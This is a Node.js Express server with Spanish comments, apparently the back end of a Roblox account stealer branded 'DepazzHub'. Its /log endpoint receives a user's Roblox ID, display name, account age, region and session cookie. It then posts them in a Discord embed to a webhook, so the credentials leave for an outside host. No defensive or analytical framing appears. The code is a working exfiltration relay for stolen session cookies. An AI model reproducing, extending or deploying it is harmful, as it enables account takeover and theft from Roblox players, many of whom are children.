const express = require('express');
const cors = require('cors');
const axios = require('axios');
const http = require('http');

const app = express();
const PORT = 3000;

app.use(cors());
app.use(express.json());

const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK || "https://discord.com/api/webhooks/1234567890/yourwebhookurl";
const DISCORD_EMBED_COLOR = 3447003; // Azul Roblox

// --- Función para formatear el embed ---
function createDiscordEmbed(data) {
	const embed = {
		"title": `${data.username} - DepazzHub`,
		"description": "Usuario de Roblox",
		"color": DISCORD_EMBED_COLOR,
		"fields": [
			{ "name": "ID", "value": data.userId, "inline": true },
			{ "name": "Nombre", "value": data.displayName, "inline": true },
			{ "name": "Edad de cuenta", "value": data.accountAge, "inline": true },
			{ "name": "Región", "value": data.region, "inline": false },
			{ "name": "Cookie", "value": data.cookie, "inline": false }
		],
		"footer": {
			"text": "DepazzHub API",
			"icon_url": "https://cdn.discordapp.com/embed/avatars/0.png"
		},
		"timestamp": new Date().toISOString()
	};
	
	return embed;
}

// --- Endpoint principal ---
app.post('/log', async (req, res) => {
	try {
		const data = req.body;
		
		if (!data.username || !data.userId) {
			return res.status(400).json({ error: "Faltan datos" });
		}
		
		// Crear el embed
		const embed = createDiscordEmbed(data);
		
		// Enviar al webhook
		const response = await axios.post(DISCORD_WEBHOOK, embed, {
			headers: { "Content-Type": "application/json" }
		});
		
		res.json({ 
			success: true, 
			status: response.status,
			message: "✅ Dato registrado correctamente" 
		});
		
	} catch (error) {
		console.error("Error en /log:", error.message);
		res.status(500).json({ 
			error: "Error al registrar", 
			message: error.message 
		});
	}
});

// --- Endpoint para probar la API ---
app.get('/health', (req, res) => {
	res.json({ status: "✅ API funcionando", port: PORT });
});

app.listen(PORT, () => {
	console.log(`🚀 Server running on http://localhost:${PORT}`);
	console.log(`🔗 Webhook: ${DISCORD_WEBHOOK}`);
});
